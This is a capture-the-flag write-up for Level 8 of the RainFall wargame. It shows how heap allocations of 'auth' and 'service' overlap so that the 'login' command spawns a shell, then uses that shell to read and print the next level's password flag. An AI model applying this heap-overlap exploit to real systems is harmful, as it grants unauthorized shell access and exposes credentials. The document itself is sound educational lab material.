# Level 8

When we launch the program, we are welcomed to put some inputs, then we see two pointer being printed, all of this in a loop.

```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
hello world
(nil), (nil) 
hi
(nil), (nil) 
\033
(nil), (nil)
```

We decompiled with Ghidra the source code, and we see that there are some strings comparisons with:
- `"auth "`
- `"reset"`
- `"service"`
- `"login"`

Lets try to use those strings:

```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
reset
0x804a008, 0x804a018 
login
Password:
0x804a008, 0x804a018 
auth 
0x804a008, 0x804a018 
```

Now some addresses are showing up. These are the addresses of two global variables:
- `auth`
- `service`

By looking more into the source code, each keyword as its own behavior:

### Auth
- Allocates 4 bytes for `auth`
- Sets the first byte of `auth` to 0
- If the length of a what's after `"auth "` of 2 bytes (aka `auth_array`) is less than 31 bytes,
copies the content of `auth_array` into the `auth` array

### Reset
- Frees the memory used by `auth` with `free()`

### Service
- Allocates bytes for the copy of what's after `"service"` (aka `service_array`)
into `serivce` with this line: `service = strdup(service_array)`

### Login
- Checks if `auth[32]` is 0:
  - If it is: Displays `"Password:\n"`
  - Else: Executes a shell with `system("/bin/sh")`

So our goal is to write anything 32 bytes after the start of `auth`.
Unfortunately, the writing in the Auth step is only 32 bytes.
But there is another way!
We saw that the address of what's stored in `auth` is `0x804a008` when done first.
We also saw that the address of what's stored in `service` is `0x804a018` when done after the command Auth.
This is very good for us, because `service` is located 16 bytes (0x10) after `auth`.
So basically if we but a `service` name that is longer than 16 bytes it should trigger the login condition:

```
level8@RainFall:~$ ./level8
(nil), (nil) 
auth
(nil), (nil) 
auth feur
0x804a008, (nil) 
serviceaaaaaaaaaaaaaaaaj
0x804a008, 0x804a018 
login
$ whoami
level9
$ cd ../level9
$ cat .pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## .pass: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
